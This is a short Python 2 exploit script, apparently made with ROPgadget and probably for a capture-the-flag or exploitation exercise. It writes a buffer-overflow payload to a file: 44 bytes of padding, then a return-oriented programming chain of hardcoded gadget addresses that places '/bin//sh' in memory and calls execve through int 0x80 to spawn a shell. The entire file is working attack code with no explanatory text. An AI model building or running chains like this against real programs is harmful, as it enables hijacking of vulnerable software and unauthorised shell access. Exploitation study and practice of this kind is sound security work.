#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

fileName="rop_data"
outfile=open(fileName, "wb")

# Padding goes here
p = '\x41'*44

p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x080a8bf6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x080a8bf6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080562c0) # xor eax, eax ; ret
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806eeb2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080562c0) # xor eax, eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x08049603) # int 0x80

outfile.write(p)
outfile.close()
